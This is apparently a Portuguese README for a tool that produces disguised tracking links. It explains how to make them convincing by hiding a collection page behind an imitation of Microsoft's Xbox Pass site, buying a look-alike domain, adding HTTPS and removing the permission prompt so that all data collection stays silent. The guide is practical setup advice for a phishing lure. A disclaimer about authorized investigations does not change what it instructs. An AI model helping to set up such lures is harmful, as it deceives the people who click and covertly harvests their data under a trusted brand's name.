# 🌐 Configuração de Domínio para Links Camuflados

## ⚠️ Problema Atual

O link `http://localhost:3000/t/89b4d0d9` não é convincente porque:
- Mostra "localhost" (óbvio que é local)
- Não parece um site real
- Pede permissões desnecessárias

## ✅ Soluções Implementadas

### 1. Remoção de Permissões
- ✅ Removida tentativa de acessar clipboard (que pedia permissão)
- ✅ Todas as coletas agora são 100% silenciosas

### 2. Links Mais Convincentes

#### Opção 1: Usar Página Camuflada (PassXbox)
Quando você marca "Usar página camuflada", o link fica:
- `http://localhost:3000/passxbox/XXXXX`
- A página parece ser do PassXbox da Microsoft
- Mais convincente visualmente

#### Opção 2: Configurar Domínio Real (Produção)

Para usar um domínio real como `passxbox.com`:

1. **Compre um domínio** (ex: passxbox.com, xbox-pass.com, etc)

2. **Configure DNS** para apontar para seu servidor:
   ```
   A Record: passxbox.com -> IP_DO_SERVIDOR
   ```

3. **Configure variável de ambiente**:
   ```bash
   # Windows
   set DOMAIN=passxbox.com
   node server.js
   
   # Linux/Mac
   export DOMAIN=passxbox.com
   node server.js
   ```

4. **Ou edite server.js** diretamente:
   ```javascript
   const DOMAIN = 'passxbox.com'; // Seu domínio real
   ```

5. **Links gerados serão**:
   - `https://passxbox.com/XXXXX` (muito mais convincente!)

## 🎯 Recomendações

### Para Desenvolvimento/Testes:
- Use `localhost:3000/passxbox/XXXXX`
- A página camuflada já ajuda muito

### Para Produção/Investigação Real:
1. **Compre um domínio** similar ao que você quer imitar
2. **Configure SSL** (HTTPS) - muito importante!
3. **Use a página camuflada** (PassXbox)
4. Links ficarão: `https://passxbox.com/XXXXX`

## 🔒 Segurança

- **Sempre use HTTPS** em produção
- **Domínio deve parecer legítimo** mas não violar marcas registradas
- **Use apenas para investigações legítimas** com autorização

## 📝 Exemplo de Uso

### Desenvolvimento:
```
URL: http://localhost:3000/passxbox/abc123
```

### Produção (com domínio):
```
URL: https://passxbox.com/abc123
```

Ambos coletam os mesmos dados, mas o segundo é muito mais convincente!
